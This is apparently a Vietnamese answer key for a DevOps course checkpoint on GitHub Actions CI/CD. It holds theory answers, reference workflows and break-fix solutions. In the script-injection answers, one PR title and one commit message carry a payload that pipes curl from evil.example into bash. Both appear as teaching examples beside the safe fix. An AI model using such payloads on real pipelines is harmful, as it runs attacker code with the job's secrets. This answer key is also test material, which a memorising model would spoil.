# Lời giải — Checkpoint Giai đoạn 5 (CI/CD)

> ⚠️ Chỉ đọc sau khi đã **commit bài làm** vào `~/devops-journey/week10/checkpoint/`. Câu trả lời khác nhưng lập luận đúng vẫn tính là đạt. Log và đầu ra là minh họa; username `phuong-dev` là ví dụ.

Quay lại đề: [checkpoint.md](../checkpoint.md)

## Mục lục

- [Phần A — Lý thuyết](#phần-a--lý-thuyết)
- [Phần B — Thực hành](#phần-b--thực-hành)
- [Phần C — Break-fix](#phần-c--break-fix)
- [Tự chấm](#tự-chấm)

---

## Phần A — Lý thuyết

**1. CI / Continuous Delivery / Continuous Deployment.**
CI: mỗi thay đổi được tích hợp thường xuyên vào nhánh chính và **tự động** build + test, phát hiện lỗi sớm. Continuous Delivery: mọi commit qua pipeline đều tạo ra artifact **sẵn sàng phát hành**; đưa lên production là một quyết định (một nút bấm, một tag). Continuous Deployment: commit xanh **tự động** lên production, không có bước người duyệt. taskhub v1: CI đầy đủ + một phần Delivery (image bất biến trên GHCR, release bằng tag) — chưa có bước deploy tự động lên môi trường nào; v3 thêm CD lên EC2.

**2. Job vs step dùng chung file?**
Mỗi job chạy trên **một runner riêng** (VM mới) → file build ở job này **không** có ở job kia; muốn chuyển phải dùng artifact (hoặc registry, cache). Các step trong cùng job chạy **tuần tự trên cùng runner, cùng workspace** → dùng chung file, biến ghi vào `$GITHUB_ENV`… Đó là lý do job `image` của taskhub phải checkout lại code.

**3. Lệnh lỗi giữa một bước `run:`.**
Trên Linux, nếu không khai báo `shell:`, GitHub chạy `bash -e {0}` → lệnh lỗi làm bash dừng ngay, lệnh thứ ba **không chạy**, step đỏ. Với pipe: `-e` chỉ xét exit code của **lệnh cuối** trong pipe → `false | tee log.txt` vẫn "thành công". Khai báo tường minh `shell: bash` thì GitHub dùng `bash --noprofile --norc -eo pipefail {0}` → lỗi ở bất kỳ vị trí nào trong pipe đều làm step đỏ. (Đây là lời hứa kiểm chứng từ [Linux bài 06](../../01-LINUX/06-bash-scripting.md).)

**4. Cache vs artifact.**
Cache: tăng tốc, **có thể mất bất cứ lúc nào**, pipeline phải đúng kể cả khi không có cache; dùng lại giữa các lần chạy. Artifact: **sản phẩm/bằng chứng** của một lần chạy (báo cáo test, file build) để người hoặc job khác tải về; có thời hạn lưu. taskhub: dependency Maven trong `~/.m2` → cache; `surefire-reports` khi test lỗi → artifact (image thì đi registry). Khóa cache của `setup-java` (`cache: maven`) là hash của `**/pom.xml`, `**/.mvn/wrapper/maven-wrapper.properties`, `**/.mvn/extensions.xml` → sửa `pom.xml` → khóa mới → cache miss → tải lại dependency → lưu cache mới.

**5. `GITHUB_TOKEN` và `permissions`.** *(bắt buộc đúng)*
Token GitHub tự sinh cho mỗi job, hết hạn khi job kết thúc (tối đa 24 giờ). Quyền của nó do khối `permissions:` quyết định. Khai báo `contents: read` ở cấp workflow → mặc định mọi job chỉ đọc được code; job nào cần hơn tự xin (nguyên tắc quyền tối thiểu): nếu một action bị chiếm quyền (như vụ trivy-action), token trong job đó chỉ làm được rất ít. Lưu ý: khai báo `permissions:` ở cấp job **thay thế** khối cấp workflow, nên phải ghi lại `contents: read`. Job push thiếu `packages: write` → đăng nhập GHCR vẫn có thể thành công nhưng **push bị từ chối** (`denied`, 403) — đúng ticket #7004.

**6. `localhost:5432` vs `postgres:5432`.**
Job Actions chạy **thẳng trên VM** runner; service container được map cổng `5432:5432` ra VM → từ job, PostgreSQL ở `localhost`. Trong Compose, app là một container riêng; `localhost` là chính nó; phải dùng tên service qua DNS nội bộ của Docker network. Service container được tạo khi job bắt đầu và **xóa khi job kết thúc** — dữ liệu không còn.

**7. Luồng PR → image.**
Mở PR → event `pull_request` → `build-test` (DB tạm, `./mvnw verify`) → `image` (build, Trivy) — không push. Merge → event `push` vào `main` → chạy lại cả hai, lần này `image` đăng nhập GHCR và push `:<sha7>`. PR không push vì code chưa được duyệt/merge — push image của mọi PR làm registry đầy image không bao giờ deploy, và (với PR từ fork) không được cấp quyền ghi. Quét trước push: image có lỗ hổng CRITICAL **không bao giờ lên registry**, nên không ai có thể vô tình deploy nó.

**8. Build một lần, triển khai nhiều nơi.**
Cùng một artifact (image cùng digest) đi qua mọi môi trường; không build lại cho từng nơi — build lại có thể ra thứ khác (dependency mới, base image mới). Release của taskhub **không build**: nó tìm `:<sha7>` mà CI đã build + test + quét cho commit được tag, rồi `imagetools create` gắn thêm `:v0.3.0` cho **chính image đó** (cùng digest). Tag phải bất biến vì "production đang chạy v0.3.0" phải luôn chỉ đúng một nội dung; rollback về `v0.2.0` chỉ đáng tin nếu `v0.2.0` hôm nay vẫn là `v0.2.0` của hôm phát hành.

**9. Vụ trivy-action và ghim SHA.** *(bắt buộc đúng)*
Tag Git chỉ là con trỏ, có thể bị push đè. Workflow ghi `@0.34.0` tự động chạy **mã độc** ở lần chạy kế tiếp sau khi tag bị đổi — mã độc chạy với quyền của job, đọc được secret và token → phải coi mọi secret là đã lộ và thay hết. Ghim SHA commit đầy đủ: SHA là hash của nội dung, kẻ tấn công không thể tạo commit khác có cùng SHA → workflow vẫn chạy đúng mã cũ, không bị ảnh hưởng. (Theo thông báo của dự án, tag `0.35.0` là tag duy nhất không bị chiếm.) Nhược điểm: SHA khó đọc và **không tự nhận bản vá** → thêm ghi chú `# vX.Y.Z` và dùng **Dependabot** (`package-ecosystem: github-actions`) tự mở PR cập nhật SHA; bạn đọc release notes rồi mới merge.

**10. Script injection.**
`${{ }}` được GitHub thay vào **văn bản** của script **trước** khi bash chạy. Tiêu đề PR do bất kỳ ai mở PR đặt → tiêu đề `a"; curl https://evil.example/x.sh | bash; echo "` trở thành lệnh thật chạy trên runner, với token và secret của job. An toàn:

```yaml
- name: In tiêu đề PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    printf 'PR: %s\n' "$PR_TITLE"
```

Giá trị đi vào **biến môi trường**; bash đọc nó như **dữ liệu** khi mở rộng `"$PR_TITLE"`, không bao giờ phân tích nó như mã.

**11. Secret vs variable; fork; environment.**
Secret: được mã hóa, che (`***`) trong log, dùng cho giá trị bí mật. Variable (`vars.X`): cấu hình không bí mật, hiện rõ trong log (tên registry, region…). PR từ fork chạy mã do **người ngoài** viết → nếu được đọc secret, chỉ cần một dòng `echo` là lộ; vì vậy GitHub không truyền secret (trừ `GITHUB_TOKEN` chỉ đọc) cho workflow kích hoạt bởi PR từ fork. Environment: gom secret riêng cho môi trường, và luật bảo vệ — **required reviewers** (người duyệt trước khi job deploy chạy), **wait timer**, giới hạn **nhánh/tag** được deploy. Trên gói Free, required reviewers và wait timer chỉ có với repo public.

**12. Chiến lược triển khai.**

| Chiến lược | Downtime | Tài nguyên | Rollback |
|---|---|---|---|
| Recreate | Có (dừng cũ → chạy mới) | Không thêm | Chạy lại bản cũ — vài chục giây đến vài phút, có downtime |
| Rolling | Không (thay dần từng instance) | Cần ≥ 2 instance + load balancer | Chậm — phải cuốn ngược từng instance |
| Blue/green | Không | Gấp đôi trong lúc chuyển | Rất nhanh — chuyển traffic về môi trường cũ còn nguyên |
| Canary | Không | Thêm một phần + đo lường tốt | Nhanh, ảnh hưởng ít người dùng |

taskhub v2–v3 (1 EC2, Compose): **recreate** là thực tế nhất — `docker compose pull && up -d` với healthcheck, chấp nhận vài giây gián đoạn, rollback bằng tag cũ. Blue/green "thô" trên một máy (hai container app, Nginx đổi upstream) làm được nhưng tốn RAM và phức tạp hơn mức cần. Rolling/canary cần nhiều instance + load balancer (lab ALB tuần 14).

**13. Rollback và migration.** *(bắt buộc đúng)*
Rollback bằng tag: đổi image về `ghcr.io/<user>/taskhub:v0.3.0` (bản trước), `pull` + `up -d`, kiểm tra `/actuator/health` và smoke test, ghi lại sự cố. Vấn đề: Flyway chạy migration **tiến** khi bản `v0.4.0` khởi động; nếu V5 xóa cột mà `v0.3.0` còn đọc → quay về `v0.3.0` thì ứng dụng lỗi (cột không còn); dữ liệu cột đã xóa không tự quay lại; Flyway không tự "undo". Cách an toàn — **expand/contract**: bản N thêm cột/bảng mới, code ghi cả hai hoặc đọc mới nhưng chịu được cũ (**không xóa gì**); chỉ khi chắc chắn không rollback về trước N nữa, bản N+1 (hoặc muộn hơn) mới xóa cột cũ. Mỗi migration phải tương thích với **phiên bản ứng dụng ngay trước đó**.

**14. Đọc GitLab CI.**
Job `unit-test` chỉ được tạo trong **pipeline Merge Request** (`CI_PIPELINE_SOURCE == "merge_request_event"`); chạy **trong container** `python:3.12-slim`; chạy unit test. Tương đương GitHub Actions: một job trong workflow `on: pull_request`, `runs-on: ubuntu-24.04` + `actions/setup-python` (hoặc `container: python:3.12-slim`), step `run: python -m unittest discover -s tests`. Stage `test` ~ thứ tự job (`needs:`).

---

## Phần B — Thực hành

Một lời giải tham khảo. SHA lấy bằng `git ls-remote` ngày 2026-10-31; `setup-python` v7.1.0 = `6d4fd22b20465ccc0f7354476588e8df7c9ca0e0`, các action còn lại xem [bảng trong labs/reference](../labs/reference/README.md). Lời giải khác vẫn đạt nếu qua 8 kiểm thử và giải thích được.

### `.github/workflows/ci.yml`

```yaml
name: CI

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

# Mặc định chỉ đọc code; workflow này không push gì nên không job nào cần thêm quyền.
permissions:
  contents: read

# Commit mới trên cùng PR → hủy lần chạy cũ. Trên main không hủy.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    name: test
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: '3.12'
      - name: Lint (cú pháp)
        run: python -m py_compile notes.py
      - name: Unit test
        run: python -m unittest discover -s tests -v

  image:
    name: image
    needs: test
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      # docker build có sẵn trên runner; stage test trong Dockerfile cũng chạy lại unit test
      - name: Build image (không push)
        run: docker build -t notes:ci .
      - name: Scan image (Trivy) — chặn CRITICAL đã có bản vá
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: notes:ci
          format: table
          severity: CRITICAL
          ignore-unfixed: true
          exit-code: '1'
```

### `.github/workflows/release.yml`

```yaml
name: Release

on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: read

# Không hủy một lần release đang chạy dở.
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release:
    name: release
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read     # khai báo ở cấp job THAY THẾ cấp workflow → phải ghi lại
      packages: write    # push image lên GHCR
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      # Tên image tự chuyển chữ thường. Hai tag: tên Git tag (giữ chữ v) + 7 ký tự SHA. Tắt latest.
      - name: Image metadata
        id: meta
        uses: docker/metadata-action@dc802804100637a589fabce1cb79ff13a1411302 # v6.2.0
        with:
          images: ghcr.io/${{ github.repository_owner }}/notes
          tags: |
            type=ref,event=tag
            type=sha,prefix=
          flavor: |
            latest=false

      - name: Build image (chưa push)
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          load: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}

      - name: Scan image (Trivy)
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: ${{ fromJSON(steps.meta.outputs.json).tags[0] }}
          format: table
          severity: CRITICAL
          ignore-unfixed: true
          exit-code: '1'

      - name: Log in to GHCR
        uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Cùng builder, cùng input → lấy từ cache → đúng image vừa quét.
      - name: Push image
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
```

### Lỗi hay gặp khi làm Phần B

| Triệu chứng | Nguyên nhân |
|---|---|
| Có thêm tag `latest` trên GHCR | Quên `flavor: latest=false` — `metadata-action` mặc định `latest=auto` sinh `latest` cho `type=ref,event=tag` |
| Tag là `1.0.0` thay vì `v1.0.0` | Dùng `type=semver,pattern={{version}}` — nó bỏ chữ `v`. Đề yêu cầu giữ tên Git tag |
| Tag SHA dạng `sha-1a2b3c4` | Quên `prefix=` trong `type=sha` |
| `invalid reference format: repository name must be lowercase` | Tự ghép `ghcr.io/${{ github.repository_owner }}/notes` trong `run:` khi owner có chữ hoa. `metadata-action` tự chuyển chữ thường; trong shell dùng `${GITHUB_REPOSITORY_OWNER,,}` |
| Kiểm thử 2 lệch số | Một `uses:` còn ghi tag (`@v7`), hoặc ghim SHA của **đối tượng tag** (tag có chú thích như trivy-action) — phải lấy dòng `^{}` |
| Kiểm thử 4 không thấy *cancelled* | `concurrency.group` không chứa `github.ref`, hoặc thiếu `cancel-in-progress` |
| Kiểm thử 7 hai digest khác nhau | Push hai lần ở hai lần build khác nhau (ví dụ build lại với label thời gian khác). Push **một lần** với cả hai tag |

---

## Phần C — Break-fix

### Bức tranh tổng thể

| Ticket | File | Nguyên nhân gốc | actionlint bắt được? |
|---|---|---|---|
| #7001 | `ci.yml` | `needs: build` trỏ tới job không tồn tại (job đã đổi tên thành `test`) | ✅ `[job-needs]` |
| #7002 | `ci.yml` | `${{ github.event.head_commit.message }}` chèn thẳng vào `run:` → script injection | ✅ `[expression]` |
| #7003 | `release.yml` | `if: github.ref == 'refs/heads/main'` trong workflow chỉ chạy cho tag → luôn sai → job luôn bị skip | ❌ — biểu thức hợp lệ; sai ở **ý nghĩa** |
| #7004 | `release.yml` | Job thiếu `packages: write`; workflow chỉ cấp `contents: read` | ❌ — actionlint không biết job của bạn sẽ ghi vào registry |

Kết quả actionlint 1.7.12 trên bản gốc (chạy thật 2026-10-31; `release.yml` không có lỗi tĩnh nào):

```text
.github/workflows/ci.yml:38:3: job "image" needs job "build" which does not exist in this workflow [job-needs]
.github/workflows/ci.yml:50:42: "github.event.head_commit.message" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/... for more details [expression]
```

**Vì sao hai lỗi sau chỉ lộ ra khi chạy thật:** actionlint kiểm tra cú pháp, tên job, kiểu dữ liệu, ngữ cảnh có sẵn, đầu vào nguy hiểm. Nó không biết `github.ref` của **một lần chạy cụ thể** sẽ là gì, cũng không biết registry sẽ đòi quyền gì. Hai lỗi đó cần đọc log + đối chiếu tài liệu. Đó là lý do bài yêu cầu kiểm chứng bằng lần chạy thật.

**Lỗi che lỗi:** #7003 làm job `publish` không chạy → #7004 bị giấu. Chỉ khi job chạy được (như đồng nghiệp thử ở log 04), lỗi quyền mới hiện ra. Sửa #7003 xong mà thấy lỗi mới thì đó là **tiến triển**, không phải bản sửa sai.

### 🎫 #7001 — CI không chạy trên PR

- **Bằng chứng:** log 01: `Job 'image' depends on unknown job 'build'` (dòng 40). Workflow không hợp lệ → GitHub không tạo job nào → check `test`, `image` không bao giờ được báo về → branch protection chờ mãi ("Expected — Waiting for status to be reported").
- **Nguyên nhân:** đổi tên job `build` → `test` nhưng quên cập nhật `needs`. `needs` tham chiếu **ID của job** (khóa YAML), không phải `name:`.
- **Sửa:** `needs: test`.
- **Kiểm chứng:** actionlint không còn `[job-needs]`; mở PR → hai check xuất hiện và xanh.
- **Bài học:** đổi tên job = đổi tên check bắt buộc trong branch protection → phải cập nhật cả rule.

### 🎫 #7002 — CI trên main đỏ dù PR xanh

- **Bằng chứng:** log 02, dòng `Run echo "Build cho commit: fix: chấp nhận tên báo cáo có dấu " (#12)"` — GitHub in ra script **sau khi đã thay biểu thức**: thông điệp commit đã thành một phần của mã bash. Dấu `"` trong thông điệp đóng chuỗi sớm, `(` thành cú pháp bash → `syntax error near unexpected token`.
- **Vì sao PR xanh:** sự kiện `pull_request` không có `head_commit` → biểu thức thành chuỗi rỗng → lệnh `echo` vô hại. Chỉ sự kiện `push` mới có thông điệp commit. Re-run vẫn đỏ vì thông điệp vẫn như cũ — không phải lỗi runner.
- **Vì sao là lỗ hổng:** ai viết được thông điệp commit (hoặc tiêu đề PR, tên nhánh…) là **chạy được lệnh** trên runner. Thông điệp `x"; curl -s https://evil.example/s.sh | bash; echo "` chạy lệnh tùy ý với token của job.
- **Sửa:** đưa qua biến môi trường (hoặc xóa hẳn dòng echo nếu không cần):

  ```yaml
      - name: Build image
        env:
          COMMIT_MSG: ${{ github.event.head_commit.message }}
        run: |
          printf 'Build cho commit: %s\n' "$COMMIT_MSG"
          docker build -t reports:ci .
  ```

- **Kiểm chứng:**

  ```bash
  git commit --allow-empty -m 'test: tên có dấu " và (ngoặc) — ticket 7002'
  git push origin main
  ```

  CI xanh; log in nguyên văn thông điệp, kể cả dấu `"`.

### 🎫 #7003 — Push tag nhưng không có release

- **Bằng chứng:** log 03 — job `publish` **skipped**, không có bước nào chạy. Workflow chỉ kích hoạt bởi `push: tags`, nên trong mọi lần chạy `github.ref` là `refs/tags/v…`, không bao giờ là `refs/heads/main` → `if` luôn sai.
- **Nhầm lẫn gốc:** tag không "thuộc" nhánh nào. Commit được tag có thể **nằm trên** `main`, nhưng sự kiện là sự kiện của tag. "Chỉ release từ main" phải kiểm tra bằng **lịch sử Git**, không phải bằng `github.ref`.
- **Sửa (giữ đúng ý định):** bỏ `if`, thêm bước kiểm tra commit có nằm trong lịch sử của `main`:

  ```yaml
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
          fetch-depth: 0          # lấy đủ lịch sử và nhánh để có origin/main

      - name: Tag phải trỏ vào commit thuộc main
        run: |
          if ! git merge-base --is-ancestor "$GITHUB_SHA" origin/main; then
            echo "::error::Tag ${GITHUB_REF_NAME} trỏ vào commit không thuộc main — từ chối release."
            exit 1
          fi
  ```

  (Cách khác — như `release.yml` của taskhub: release chỉ **gắn tag** cho image mà CI đã push từ `main`; commit không thuộc `main` thì không có image → release thất bại một cách tự nhiên.)
- **Kiểm chứng:** tag commit của `main` → `publish` chạy (và gặp #7004 nếu chưa sửa). Thử chiều ngược lại:

  ```bash
  git switch -c exp/not-main && git commit --allow-empty -m "test: commit ngoài main"
  git tag -a v9.9.9-test -m "thử" && git push origin v9.9.9-test
  # → Release đỏ ở bước kiểm tra, có thông báo ::error::
  git push origin :refs/tags/v9.9.9-test && git tag -d v9.9.9-test && git switch main
  ```

### 🎫 #7004 — `Login Succeeded` nhưng push bị `denied`

- **Bằng chứng:** log 04 — đăng nhập thành công, build và quét xanh, chỉ bước push lỗi `denied: permission_denied: write_package`. Workflow khai báo `permissions: contents: read`, job không khai báo thêm → `GITHUB_TOKEN` của job **không có** quyền `packages: write`.
- **Bản chất:** đăng nhập là **xác thực** (bạn là ai) — token hợp lệ nên thành công. Push là **phân quyền** (bạn được làm gì) — registry kiểm tra quyền ghi của token lúc push. Hai bước khác nhau, lỗi ở bước thứ hai.
- **Sửa:**

  ```yaml
    publish:
      name: publish
      runs-on: ubuntu-24.04
      timeout-minutes: 15
      permissions:
        contents: read     # cấp job THAY THẾ cấp workflow → phải ghi lại, nếu không checkout lỗi
        packages: write
  ```

- **Vì sao không theo ý đồng nghiệp (tạo PAT):** PAT sống lâu, thường phạm vi rộng hơn cần, phải tự xoay vòng, lộ là nguy hiểm lâu dài. `GITHUB_TOKEN` hết hạn theo job và chỉ có đúng quyền được khai báo. (Ghi chú: nếu package `reports` đã từng được push **bằng tay** trước đó, còn phải cấp quyền cho repo trong *Package settings → Manage Actions access*. Ở bài này package được workflow tạo lần đầu nên tự liên kết với repo.)
- **Kiểm chứng:**

  ```bash
  git tag -a v1.4.2 -m "Release v1.4.2" && git push origin v1.4.2
  # Package mặc định private: đặt public, hoặc docker login ghcr.io bằng PAT read:packages
  docker run --rm -d -p 18080:8080 --name ck05-rp ghcr.io/<owner>/reports:v1.4.2
  sleep 2; curl -s localhost:18080/health      # {"status": "ok", "version": "v1.4.2"}
  docker rm -f ck05-rp
  ```

### Nhật ký mẫu cho một ticket (#7004)

```markdown
## 🎫 #7004
- Triệu chứng: Release đỏ ở bước Push image, "denied: permission_denied: write_package", ngay sau "Login Succeeded".
- Giả thuyết 1: token sai → loại, vì login thành công.
- Giả thuyết 2: token đúng nhưng thiếu quyền ghi package.
- Bằng chứng: release.yml chỉ có `permissions: contents: read` ở cấp workflow, job publish không khai báo permissions.
  Docs GitHub: job push GHCR bằng GITHUB_TOKEN cần `packages: write`.
- Nguyên nhân gốc: thiếu quyền packages: write cho GITHUB_TOKEN của job publish.
- Sửa: thêm permissions cấp job (contents: read + packages: write).
- Kiểm chứng: tag v1.4.2 → run <link> xanh, image có trên GHCR, /health trả version v1.4.2.
- actionlint không bắt được vì: đây là quyền runtime của registry, không phải lỗi cú pháp.
```

---

## Tự chấm

- Phần A: câu 5, 9, 13 phải đúng **bản chất** (quyền tối thiểu và khác biệt xác thực/phân quyền; tag có thể bị đổi, SHA thì không + Dependabot; rollback và migration không tương thích ngược / expand-contract).
- Phần B: tính đạt khi đủ 8 kiểm thử có **link lần chạy**; thiếu link = chưa chứng minh.
- Phần C: mỗi ticket cần có **dòng bằng chứng** (log hoặc YAML) dẫn tới nguyên nhân. Sửa đúng mà không giải thích được cách tìm ra → ticket đó chưa đạt. Riêng #7003: chỉ xóa `if` (mất ý định "chỉ từ main") → đạt một nửa.
